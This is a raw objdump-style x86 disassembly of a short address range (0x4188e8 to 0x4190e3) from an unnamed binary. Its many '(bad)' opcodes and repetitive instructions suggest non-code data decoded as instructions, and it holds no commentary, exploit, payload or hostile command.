  4188e8:	or     BYTE PTR [edi-0x58fffe5d],ah
  4188ee:	fwait
  4188ef:	inc    DWORD PTR [ecx]
  4188f1:	scas   eax,DWORD PTR es:[edi]
  4188f2:	fwait
  4188f3:	(bad)  
  4188f4:	jmp    DWORD PTR [edi-0x58fe0065]
  4188fa:	fwait
  4188fb:	add    DWORD PTR [edx],eax
  4188fd:	lahf   
  4188fe:	mov    ds:0x93af0201,eax
  418903:	inc    DWORD PTR [ecx]
  418905:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418906:	xchg   ebx,eax
  418907:	(bad)  
  418908:	call   FWORD PTR [edi-0x58fe0065]
  41890e:	fwait
  41890f:	add    DWORD PTR [edx],eax
  418911:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418912:	xchg   ebx,eax
  418913:	(bad)  
  418914:	jmp    FWORD PTR [edi-0x58fffe6d]
  41891a:	mov    ds:0x1ff,eax
	...
  41892f:	add    BYTE PTR [eax],al
  418931:	add    BYTE PTR [edi-0x58000065],bl
  418937:	fwait
  418938:	add    DWORD PTR [eax],eax
  41893a:	scas   eax,DWORD PTR es:[edi]
  41893b:	fwait
  41893c:	inc    DWORD PTR [ecx]
  41893e:	lahf   
  41893f:	fwait
  418940:	add    DWORD PTR [eax],eax
  418942:	lahf   
  418943:	mov    ds:0x93a70201,eax
  418948:	(bad)  
  418949:	jmp    DWORD PTR [edi-0x58fdfe65]
  41894f:	fwait
  418950:	inc    DWORD PTR [ecx]
  418952:	lahf   
  418953:	fwait
  418954:	(bad)  
  418955:	jmp    FWORD PTR [edi-0x58fffe65]
  41895b:	fwait
  41895c:	(bad)  
  41895d:	jmp    DWORD PTR [edi-0x58fdfe5d]
  418963:	mov    ds:0x9baf01ff,eax
  418968:	(bad)  
  418969:	jmp    FWORD PTR [edi-0x60fffe6d]
  41896f:	fwait
  418970:	(bad)  
  418971:	jmp    DWORD PTR [edi-0x58fffe65]
  418977:	add    ch,bh
  418979:	add    esp,DWORD PTR [ebp-0x58fe1106]
  41897f:	cli    
  418980:	out    0x3,al
  418982:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418983:	add    ah,bh
  418985:	add    esp,DWORD PTR [edi-0x5afe1106]
  41898b:	cli    
  41898c:	out    dx,al
  41898d:	add    esp,DWORD PTR [edi-0x5afe20fe]
  418993:	add    ah,bh
  418995:	add    DWORD PTR [eax],eax
	...
  4189ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4189ac:	add    ch,bh
  4189ae:	add    esp,DWORD PTR [edi-0x5afc1906]
  4189b4:	cli    
  4189b5:	fiadd  WORD PTR ds:0x5defaa7
  4189bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4189bc:	add    ah,bh
  4189be:	add    esp,DWORD PTR [ebp-0x5afa1106]
  4189c4:	add    bl,bh
  4189c6:	add    esp,DWORD PTR [edi-0x5afc20fe]
  4189cc:	cli    
  4189cd:	out    0x5,al
  4189cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4189d0:	add    ch,al
  4189d2:	jecxz  0x418a24
  4189d4:	add    ch,BYTE PTR [eax-0x1c]
  4189d7:	enter  0x688c,0xe4
  4189db:	ror    BYTE PTR [edi+eiz*2+0x6702a704],0xe4
  4189e3:	xor    BYTE PTR [edx],al
  4189e5:	push   0xe8022704
  4189ea:	add    esp,DWORD PTR [edi]
  4189ec:	add    ebp,eax
  4189ee:	jecxz  0x418988
  4189f0:	mov    edi,fs
  4189f2:	add    esp,DWORD PTR [edi+0x8e3e702]
  4189f8:	add    esp,edi
  4189fa:	jecxz  0x4189fc
  4189fc:	add    ebp,DWORD PTR [eax-0x1c]
  4189ff:	clc    
  418a00:	add    ch,BYTE PTR [eax+0x4]
  418a03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a04:	add    al,BYTE PTR [eax]
  418a06:	jmp    0x69418caf
  418a0b:	stos   DWORD PTR es:[edi],eax
  418a0c:	add    BYTE PTR [eax],0xe8
	...
  418a23:	add    BYTE PTR [edx+eax*4+0x2a4e800],ah
  418a2a:	add    cl,ch
  418a2c:	inc    esp
  418a2d:	mov    ebp,?
  418a2f:	jmp    0xe8420cd8
  418a34:	inc    esp
  418a35:	or     al,0x0
  418a37:	imul   ebp,DWORD PTR [ebx-0x5b16fffe],0x4e80082
  418a41:	mov    ebp,?
  418a43:	imul   eax,DWORD PTR [esp+ecx*4],0x82a468fd
  418a4a:	add    al,ch
  418a4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a4d:	add    al,BYTE PTR [eax]
  418a4f:	imul   eax,DWORD PTR [esp+ecx*4],0x82a469fd
  418a56:	add    cl,ch
  418a58:	add    al,0x8c
  418a5a:	std    
  418a5b:	imul   eax,DWORD PTR [esp+ecx*1],0xbc46800
  418a62:	add    BYTE PTR [eax-0x5c],ch
  418a65:	add    al,BYTE PTR [eax]
  418a67:	imul   esp,DWORD PTR [edx+eax*4-0x7d5b1800],0xbc4e900
  418a72:	add    BYTE PTR [eax-0x3c],ch
  418a75:	or     eax,DWORD PTR [eax]
  418a77:	push   0xe90002a4
  418a7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a7d:	add    al,BYTE PTR [eax]
  418a7f:	jmp    0xe9418d28
  418a84:	test   BYTE PTR [ebx],cl
  418a86:	add    BYTE PTR [ecx+0x0],ch
	...
  418a9d:	test   BYTE PTR [ebx-0x7d5b9603],cl
  418aa3:	add    BYTE PTR [eax-0x5c],ch
  418aa6:	add    BYTE PTR [eax],0x0
  418aa9:	(bad)  
  418aaa:	(bad)  
  418aab:	(bad)  
  418aac:	(bad)  
  418aad:	jg     0x418a4e
  418aaf:	jge    0x418ab1
  418ab1:	call   FWORD PTR [edi-0x60300003]
  418ab7:	std    
  418ab8:	dec    esi
  418aba:	(bad)  
  418abb:	(bad)  
  418abc:	(bad)  
  418abd:	mov    edi,0xbf007d9f
  418ac2:	(bad)  
  418ac3:	(bad)  
  418ac4:	dec    DWORD PTR [edi-0x1]
  418ac7:	(bad)  
  418ac8:	dec    DWORD PTR [esi-0x61]
  418acb:	std    
  418acc:	(bad)  
  418acd:	aas    
  418ace:	(bad)  
  418acf:	jg     0x418ad1
  418ad1:	aas    
  418ad2:	lahf   
  418ad3:	std    
  418ad4:	dec    DWORD PTR [esi-0x70ff8261]
  418ada:	push   es
  418adb:	add    BYTE PTR [eax],0xff
  418ade:	sahf   
  418adf:	std    
  418ae0:	(bad)  
  418ae1:	jle    0x418a89
  418ae3:	std    
  418ae4:	dec    DWORD PTR [esi]
  418ae6:	(bad)  
  418ae7:	jg     0x418ae9
  418ae9:	setg   BYTE PTR [ebp+0x0]
  418aed:	jle    0x418af5
  418aef:	add    BYTE PTR [eax],al
  418af1:	(bad)  
  418af2:	(bad)  
  418af3:	jg     0x418af5
  418af5:	into   
  418af6:	sahf   
  418af7:	std    
  418af8:	dec    DWORD PTR [esi-0x5a]
  418afb:	jge    0x418afd
  418afd:	mov    esi,0xffffff
	...
  418b16:	mov    esi,0xce0207ff
  418b1b:	inc    BYTE PTR [edi]
  418b1d:	add    cl,dh
  418b1f:	(bad)  
  418b20:	inc    DWORD PTR [ecx-0x42]
  418b23:	inc    BYTE PTR [edi]
  418b25:	add    BYTE PTR [esi-0x71000001],bh
  418b2b:	push   es
  418b2c:	add    BYTE PTR [eax-0x72],al
  418b2f:	push   es
  418b30:	or     BYTE PTR [edx],al
  418b32:	jle    0x418b39
  418b34:	or     BYTE PTR [eax-0x59],al
  418b37:	fwait
  418b38:	add    DWORD PTR [eax],ecx
  418b3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b3b:	fwait
  418b3c:	add    al,BYTE PTR [eax]
  418b3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b3f:	fwait
  418b40:	add    cl,BYTE PTR [eax]
  418b42:	out    0x9b,eax
  418b44:	add    al,BYTE PTR [eax]
  418b46:	in     eax,0x9b
  418b48:	add    DWORD PTR [eax],ecx
  418b4a:	in     eax,0x9b
  418b4c:	add    cl,BYTE PTR [eax]
  418b4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b4f:	fwait
  418b50:	add    DWORD PTR [eax],eax
  418b52:	out    0x9b,eax
  418b54:	add    DWORD PTR [eax],eax
  418b56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b57:	fwait
  418b58:	add    DWORD PTR [eax],ecx
  418b5a:	out    0x9b,eax
  418b5c:	add    DWORD PTR [eax],ecx
  418b5e:	out    0x9b,eax
  418b60:	add    DWORD PTR [eax],eax
  418b62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b63:	fwait
  418b64:	add    al,BYTE PTR [eax]
  418b66:	out    0x9b,eax
  418b68:	add    cl,BYTE PTR [eax]
  418b6a:	gs fwait
  418b6c:	add    cl,BYTE PTR [eax]
  418b6e:	gs fwait
  418b70:	add    al,BYTE PTR [eax]
  418b72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b73:	fwait
  418b74:	add    DWORD PTR [eax],ecx
  418b76:	gs fwait
  418b78:	add    al,BYTE PTR [eax]
	...
  418b8e:	add    BYTE PTR [edi-0x65],ah
  418b91:	add    DWORD PTR [eax],eax
  418b93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b94:	fwait
  418b95:	add    DWORD PTR [eax],eax
  418b97:	gs fwait
  418b99:	add    cl,BYTE PTR [eax]
  418b9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b9c:	fwait
  418b9d:	add    DWORD PTR [eax],eax
  418b9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ba0:	fwait
  418ba1:	add    DWORD PTR [eax],eax
  418ba3:	gs fwait
  418ba5:	add    cl,BYTE PTR [eax]
  418ba7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ba8:	fwait
  418ba9:	add    DWORD PTR [eax],ecx
  418bab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418bac:	fwait
  418bad:	add    al,BYTE PTR [eax]
  418baf:	gs fwait
  418bb1:	add    al,BYTE PTR [eax]
  418bb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418bb4:	fwait
  418bb5:	add    DWORD PTR [eax],eax
  418bb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418bb8:	fwait
  418bb9:	add    DWORD PTR [eax],eax
  418bbb:	addr16 fwait
  418bbd:	add    DWORD PTR [eax],ecx
  418bbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418bc0:	fwait
  418bc1:	add    al,BYTE PTR [eax]
  418bc3:	in     eax,0x2
  418bc5:	out    0x2,eax
  418bc7:	lahf   
  418bc8:	inc    edx
  418bc9:	out    0x2,eax
  418bcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418bcc:	add    al,0xe7
  418bce:	add    esp,DWORD PTR [edi-0x50fc18be]
  418bd4:	inc    esp
  418bd5:	out    0x2,eax
  418bd7:	lahf   
  418bd8:	add    al,0xe7
  418bda:	add    bl,BYTE PTR [edi-0x58fd18be]
  418be0:	add    ah,bh
  418be2:	add    esp,DWORD PTR [edi-0x60fc18fc]
  418be8:	inc    esp
  418be9:	out    0x2,eax
  418beb:	lahf   
  418bec:	inc    esp
  418bed:	out    0x2,eax
  418bef:	scas   eax,DWORD PTR es:[edi]
  418bf0:	add    ah,bh
  418bf2:	add    eax,DWORD PTR [eax]
	...
  418c08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c09:	inc    esp
  418c0a:	out    0x2,eax
  418c0c:	lahf   
  418c0d:	inc    esp
  418c0e:	out    0x3,eax
  418c10:	lahf   
  418c11:	add    al,0xe7
  418c13:	add    esp,DWORD PTR [edi-0x50fc18fe]
  418c19:	inc    edx
  418c1a:	out    0x3,eax
  418c1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c1d:	inc    esp
  418c1e:	out    0x4,eax
  418c20:	lahf   
  418c21:	add    ah,bh
  418c23:	add    al,0xa7
  418c25:	add    al,0xe7
  418c27:	add    al,0xa7
  418c29:	inc    edx
  418c2a:	out    0x3,eax
  418c2c:	lahf   
  418c2d:	add    ah,bh
  418c2f:	add    esp,DWORD PTR [edi-0x50fc18fe]
  418c35:	inc    edx
  418c36:	out    0x4,eax
  418c38:	scas   eax,DWORD PTR es:[edi]
  418c39:	add    al,0xe7
  418c3b:	add    al,0xa7
  418c3d:	inc    edx
  418c3e:	test   DWORD PTR [ebx],0x3e6e2a7
  418c44:	addr16 loop 0x418c2d
  418c47:	inc    ebx
  418c48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c49:	add    dl,bh
  418c4b:	inc    ebx
  418c4c:	addr16 loop 0x418c35
  418c4f:	add    esp,DWORD PTR [edi-0x1e]
  418c52:	(bad)  
  418c53:	fsub   DWORD PTR [edx+eax*1+0x42e4d900]
  418c5a:	and    cl,ch
  418c5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c5d:	inc    edx
  418c5e:	add    cl,ch
  418c60:	in     al,0x2
  418c62:	and    cl,bh
  418c64:	in     al,0x42
  418c66:	add    cl,ch
  418c68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c69:	inc    edx
  418c6a:	add    cl,bl
	...
  418c80:	add    BYTE PTR [edx+eax*1+0x42a4d920],ah
  418c87:	add    cl,ch
  418c89:	in     al,0x2
  418c8b:	and    cl,ch
  418c8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c8e:	add    ah,BYTE PTR [eax]
  418c90:	stc    
  418c91:	in     al,0x2
  418c93:	add    cl,ch
  418c95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c96:	add    al,BYTE PTR [eax]
  418c98:	stc    
  418c99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c9a:	inc    edx
  418c9b:	add    cl,bh
  418c9d:	in     al,0x2
  418c9f:	and    cl,ch
  418ca1:	in     al,0x2
  418ca3:	add    cl,ch
  418ca5:	in     al,0x42
  418ca7:	add    cl,bl
  418ca9:	add    ah,BYTE PTR fs:[eax]
  418cac:	fldenv [edx+eax*1+0x42a4f900]
  418cb3:	and    cl,bh
  418cb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418cb6:	inc    edx
  418cb7:	and    cl,ch
  418cb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418cba:	add    al,BYTE PTR [eax]
  418cbc:	stc    
  418cbd:	fs inc edx
  418cbf:	add    cl,ch
  418cc1:	fs inc edx
  418cc3:	and    cl,bl
  418cc5:	add    al,BYTE PTR fs:[eax]
  418cc8:	jmp    0xe941cf31
  418ccd:	fs inc edx
  418ccf:	and    cl,ch
  418cd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418cd2:	add    ah,BYTE PTR [eax]
  418cd4:	jmp    0xf9618f3d
  418cd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418cda:	add    al,BYTE PTR [eax]
  418cdc:	stc    
  418cdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418cde:	inc    edx
  418cdf:	and    BYTE PTR [eax],al
  418ce1:	mov    esi,0x4043
	...
  418cfa:	into   
  418cfb:	inc    ebx
  418cfc:	inc    eax
  418cfd:	and    BYTE PTR [esi+0x7e004003],cl
  418d03:	inc    ebx
  418d04:	add    BYTE PTR [eax],al
  418d06:	mov    es,WORD PTR [ebx]
  418d08:	add    BYTE PTR [eax],ah
  418d0a:	jle    0x418d0f
  418d0c:	inc    eax
  418d0d:	add    BYTE PTR [esi-0x71dfffbd],cl
  418d13:	add    eax,DWORD PTR [eax]
  418d15:	and    BYTE PTR [esi+0x43],cl
  418d18:	add    BYTE PTR [eax],al
  418d1a:	dec    esi
  418d1b:	add    eax,DWORD PTR [eax]
  418d1d:	and    BYTE PTR [esi+0x43],bh
  418d20:	inc    eax
  418d21:	and    BYTE PTR [esi+0x43],cl
  418d24:	inc    eax
  418d25:	add    BYTE PTR [esi],bh
  418d27:	add    eax,DWORD PTR [eax+0x20]
  418d2a:	dec    esi
  418d2b:	inc    ebx
  418d2c:	inc    eax
  418d2d:	add    BYTE PTR [esi+0x43],cl
  418d30:	inc    eax
  418d31:	and    BYTE PTR [esi+0x3],cl
  418d34:	add    BYTE PTR [eax],al
  418d36:	dec    esi
  418d37:	add    eax,DWORD PTR [eax+0x20]
  418d3a:	dec    esi
  418d3b:	add    eax,DWORD PTR [eax]
  418d3d:	add    BYTE PTR [esi],cl
  418d3f:	inc    ebx
  418d40:	add    BYTE PTR [eax],al
  418d42:	push   cs
  418d43:	add    eax,DWORD PTR [eax+0x20]
  418d46:	push   cs
  418d47:	inc    ebx
  418d48:	inc    eax
  418d49:	add    dh,bh
  418d4b:	inc    edx
  418d4c:	add    BYTE PTR [eax],al
  418d4e:	inc    BYTE PTR [edx]
  418d50:	inc    eax
  418d51:	add    dh,bh
  418d53:	inc    edx
  418d54:	add    BYTE PTR [eax],ah
  418d56:	inc    BYTE PTR [edx]
  418d58:	add    BYTE PTR [eax],al
  418d5a:	inc    BYTE PTR [edx+0x40]
  418d5d:	and    BYTE PTR [eax],al
	...
  418d73:	into   
  418d74:	add    al,BYTE PTR [eax]
  418d76:	and    dh,bh
  418d78:	add    al,BYTE PTR [eax+0x0]
  418d7b:	into   
  418d7c:	inc    edx
  418d7d:	add    BYTE PTR [eax],ah
  418d7f:	mov    esi,0xa7002002
  418d84:	fwait
  418d85:	add    DWORD PTR [eax],esp
  418d87:	mov    ds:0xa4fff99b,eax
  418d8c:	cdq    
  418d8d:	add    DWORD PTR [eax],eax
  418d8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d90:	cdq    
  418d91:	stc    
  418d92:	jmp    DWORD PTR [eax-0x5b000666]
  418d98:	cdq    
  418d99:	stc    
  418d9a:	pop    ds
  418d9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d9c:	fwait
  418d9d:	stc    
  418d9e:	pop    ds
  418d9f:	mov    ds:0xab1ff999,eax
  418da4:	fwait
  418da5:	add    DWORD PTR [eax],esp
  418da7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418da8:	fwait
  418da9:	add    DWORD PTR [eax],eax
  418dab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418dac:	cdq    
  418dad:	add    DWORD PTR [eax],eax
  418daf:	mov    ds:0xa7000199,eax
  418db4:	fwait
  418db5:	add    DWORD PTR [eax],eax
  418db7:	mov    ds:0xab200199,eax
  418dbc:	cdq    
  418dbd:	stc    
  418dbe:	dec    DWORD PTR [eax-0x64]
  418dc1:	stc    
  418dc2:	jmp    DWORD PTR [ecx+ebx*4-0x6658e007]
  418dc9:	add    DWORD PTR [eax],esp
  418dcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418dcc:	fwait
  418dcd:	stc    
  418dce:	jmp    DWORD PTR [ecx+ebx*4-0x6454ffff]
  418dd5:	add    DWORD PTR [eax],esp
	...
  418deb:	add    BYTE PTR [ebx-0x54e00665],ah
  418df1:	cdq    
  418df2:	add    DWORD PTR [eax],esp
  418df4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418df5:	fwait
  418df6:	add    DWORD PTR [eax],esp
  418df8:	stos   DWORD PTR es:[edi],eax
  418df9:	fwait
  418dfa:	stc    
  418dfb:	(bad)  
  418dfc:	clc    
  418dfd:	cdq    
  418dfe:	stc    
  418dff:	push   eax
  418e01:	cdq    
  418e02:	stc    
  418e03:	pop    ds
  418e04:	mov    ds:0xa71ff99b,eax
  418e09:	cdq    
  418e0a:	add    DWORD PTR [eax],eax
  418e0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e0d:	fwait
  418e0e:	add    DWORD PTR [eax],eax
  418e10:	stos   DWORD PTR es:[edi],eax
  418e11:	add    ah,bh
  418e13:	sti    
  418e14:	test   al,0x2
  418e16:	out    0x3,eax
  418e18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e19:	(bad)  
  418e1a:	out    0xfb,al
  418e1c:	cwde   
  418e1d:	add    ah,bh
  418e1f:	add    eax,DWORD PTR [edi-0x570416fe]
  418e25:	add    ecx,ebp
  418e27:	sti    
  418e28:	mov    al,ds:0xc703e901
  418e2d:	(bad)  
  418e2e:	call   0xe9405536
  418e33:	add    esp,DWORD PTR [edi-0x38fc16fe]
  418e39:	add    ah,bh
  418e3b:	add    esp,DWORD PTR [edi+0x70fbe6fe]
  418e41:	add    edi,esp
  418e43:	add    eax,edi
  418e45:	add    ah,bh
  418e47:	sti    
  418e48:	sar    dh,0xe8
  418e4b:	sti    
  418e4c:	pop    eax
  418e4d:	test   ecx,ebp
  418e4f:	sti    
	...
  418e64:	add    BYTE PTR [eax-0x570418fe],dh
  418e6a:	(bad)  
  418e6b:	call   0xe9c6cf6b
  418e70:	add    esp,DWORD PTR [edi-0x6f041702]
  418e76:	(bad)  
  418e77:	out    0x3,al
  418e79:	xchg   esi,edi
  418e7b:	out    0xfb,al
  418e7d:	rol    BYTE PTR [edx],0xe7
  418e80:	add    esp,DWORD PTR [edi-0x58fc16fe]
  418e86:	add    ch,cl
  418e88:	sti    
  418e89:	test   al,0xfe
  418e8b:	out    0x3,al
  418e8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e8e:	add    ch,cl
  418e90:	sti    
  418e91:	cwde   
  418e92:	add    ah,bh
  418e94:	add    eax,edi
  418e96:	(bad)  
  418e97:	out    0xfb,al
  418e99:	call   0xa7457822
  418e9e:	(bad)  
  418e9f:	(bad)  
  418ea0:	call   0xe9431381
  418ea5:	int3   
  418ea6:	test   ch,bh
  418ea8:	jmp    0x418e4e
  418eaa:	loop   0x418eab
  418eac:	sub    BYTE PTR [ebx-0x4b16f27c],bh
  418eb2:	test   ch,bh
  418eb4:	jmp    0x29418d5d
  418eb9:	mov    bl,0x0
  418ebb:	adc    cl,ch
  418ebd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ebe:	add    dl,BYTE PTR [eax]
  418ec0:	sub    DWORD PTR [ebx-0x54d6f27c],edx
  418ec6:	add    al,BYTE PTR [eax]
  418ec8:	jmp    0x418ecd
	...
  418edd:	add    BYTE PTR [edx+eax*1-0x15b56f0],ah
  418ee4:	(bad)  
  418ee5:	call   0xa9518d8e
  418eea:	je     0x418eec
  418eec:	adc    cl,ch
  418eee:	je     0x418ef0
  418ef0:	add    cl,ch
  418ef2:	push   esp
  418ef3:	add    BYTE PTR [eax],dl
  418ef5:	test   eax,0xe9000054
  418efa:	push   esp
  418efb:	test   ch,bh
  418efd:	test   eax,0xe90002a4
  418f02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f03:	dec    BYTE PTR [edi]
  418f05:	test   eax,0xe91002a4
  418f0a:	xor    al,0x84
  418f0c:	or     eax,0xfd8434a9
  418f11:	jmp    0xa9418f2a
  418f16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f17:	(bad)  
  418f18:	jmp    FWORD PTR [eax-0x16f0015c]
  418f1e:	adc    al,0x0
  418f20:	adc    BYTE PTR [ecx],ch
  418f22:	sti    
  418f23:	cmp    ebp,0xffffffe9
  418f26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f27:	add    al,BYTE PTR [eax]
  418f29:	jmp    0x4191d2
  418f2e:	mov    esi,0x8e1003fe
  418f33:	(bad)  
  418f34:	dec    DWORD PTR [edi]
  418f36:	into   
  418f37:	(bad)  
  418f38:	std    
  418f39:	movd   DWORD PTR [esi-0x41ffff],mm1
  418f40:	add    eax,DWORD PTR [eax]
	...
  418f56:	add    BYTE PTR [esi-0x31fffe72],cl
  418f5c:	inc    DWORD PTR [ebx]
  418f5e:	add    BYTE PTR [esi-0x41effe71],bh
  418f64:	(bad)  
  418f65:	std    
  418f66:	dec    esi
  418f68:	(bad)  
  418f69:	(bad)  
  418f6a:	dec    esi
  418f6c:	inc    BYTE PTR [ebx]
  418f6e:	adc    BYTE PTR [esi-0x71],bh
  418f71:	std    
  418f72:	(bad)  
  418f73:	pop    DWORD PTR ds:[ecx]
  418f76:	add    BYTE PTR [esi+0x4e0ffd8f],cl
  418f7c:	(bad)  
  418f7d:	(bad)  
  418f7e:	(bad)  
  418f7f:	ds (bad) 
  418f81:	dec    DWORD PTR [edi]
  418f83:	jle    0x418f84
  418f85:	add    edx,DWORD PTR [eax]
  418f87:	push   cs
  418f88:	inc    DWORD PTR [ebx]
  418f8a:	adc    BYTE PTR [esi-0x1],cl
  418f8d:	dec    DWORD PTR [edi]
  418f8f:	inc    DWORD PTR ds:[ebx]
  418f92:	add    dh,bh
  418f94:	mov    ?,ebp
  418f96:	cmovle edi,edi
  418f99:	(bad)  
  418f9a:	dec    DWORD PTR [esi]
  418f9c:	pop    DWORD PTR [ecx]
  418f9e:	adc    dh,bh
  418fa0:	inc    BYTE PTR [ebx]
  418fa2:	add    dh,bh
  418fa4:	(bad)  
  418fa5:	dec    DWORD PTR [edi]
  418fa7:	push   cs
  418fa8:	inc    DWORD PTR [ebx]
  418faa:	adc    BYTE PTR [esi],cl
  418fac:	(bad)  
  418fad:	std    
  418fae:	(bad)  
  418fb0:	(bad)  
  418fb1:	std    
  418fb2:	paddd  mm7,mm6
  418fb5:	(bad)  
  418fb6:	dec    esi
  418fb8:	mov    es,WORD PTR [ecx]
  418fba:	adc    BYTE PTR [eax],al
	...
  418fd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418fd1:	cdq    
  418fd2:	icebp  
  418fd3:	add    esp,DWORD PTR [edi-0x58fc0e67]
  418fd9:	fpatan 
  418fdb:	jmp    eax
  418fdd:	fdiv   st,st(3)
  418fdf:	(bad)  
  418fe0:	fcomp  st(0)
  418fe2:	add    eax,DWORD PTR [edi+eiz*4]
  418fe5:	cdq    
  418fe6:	add    DWORD PTR [eax],eax
  418fe8:	mov    bh,0x99
  418fea:	icebp  
  418feb:	add    edx,DWORD PTR [edi-0x4700d663]
  418ff1:	cwde   
  418ff2:	add    DWORD PTR [eax],eax
  418ff4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ff5:	cdq    
  418ff6:	add    DWORD PTR [eax],eax
  418ff8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ff9:	lds    ebp,FWORD PTR [ecx]
  418ffb:	jmp    DWORD PTR [eax-0x6700d724]
  419001:	xchg   esp,eax
  419002:	sub    al,0xff
  419004:	nop
  419005:	ins    BYTE PTR es:[edi],dx
  419006:	add    DWORD PTR [eax],eax
  419008:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419009:	imul   eax,DWORD PTR [ecx],0x0
  41900c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41900d:	sbb    DWORD PTR [edi],esp
  41900f:	(bad)  
  419010:	js     0x419062
  419012:	sub    edi,edi
  419014:	jo     0x418fee
  419016:	sub    edi,edi
  419018:	push   0xa700016c
  41901d:	imul   eax,DWORD PTR [ecx],0x0
  419020:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419021:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419022:	sub    bh,bh
  419024:	push   eax
  419025:	in     al,dx
  419026:	sub    eax,0x2c2848ff
  41902b:	inc    DWORD PTR [eax+0x6c]
  41902e:	add    DWORD PTR [eax],eax
  419030:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419031:	imul   eax,DWORD PTR [ecx],0x0
	...
  419048:	add    BYTE PTR [edi+0x28ff216b],ah
  41904e:	hlt    
  41904f:	sub    eax,0x2a5420ff
  419054:	call   FWORD PTR [eax]
  419056:	ins    BYTE PTR es:[edi],dx
  419057:	add    DWORD PTR [eax],eax
  419059:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41905a:	imul   eax,DWORD PTR [ecx],0x0
  41905d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41905e:	add    al,BYTE PTR ds:0x93820024
  419064:	sub    eax,0x2b1781f8
  419069:	lock and edi,0xe702a703
  419070:	add    esp,DWORD PTR [edi-0x27dbecfe]
  419076:	xor    DWORD PTR [ebx+0x2d],0x2aeb81d0
  41907d:	enter  0xe781,0x3
  419081:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419082:	add    ah,bh
  419084:	add    esp,DWORD PTR [edi-0x4fdcb2fe]
  41908a:	sbb    DWORD PTR [edi+0x1f81a82d],0xe781a02b
  419094:	add    esp,DWORD PTR [edi-0x58fc18fe]
  41909a:	add    al,ch
  41909c:	and    cl,BYTE PTR [eax-0x7fd2b47f]
  4190a2:	and    DWORD PTR [ebx+0x2a],0x3e78178
  4190a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190aa:	add    ah,bh
  4190ac:	add    eax,DWORD PTR [eax]
	...
  4190c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190c3:	add    ah,BYTE PTR [ecx-0x287e9fde]
  4190c9:	sub    al,0x58
  4190cb:	and    edi,0xe702a703
  4190d1:	add    esp,DWORD PTR [edi-0x58fc18fe]
  4190d7:	add    ah,bh
  4190d9:	add    esp,DWORD PTR [edi-0x58fc18fe]
  4190df:	add    ch,bl
  4190e1:	sub    al,0x28
  4190e3:	adc    ecx,0xb581202c
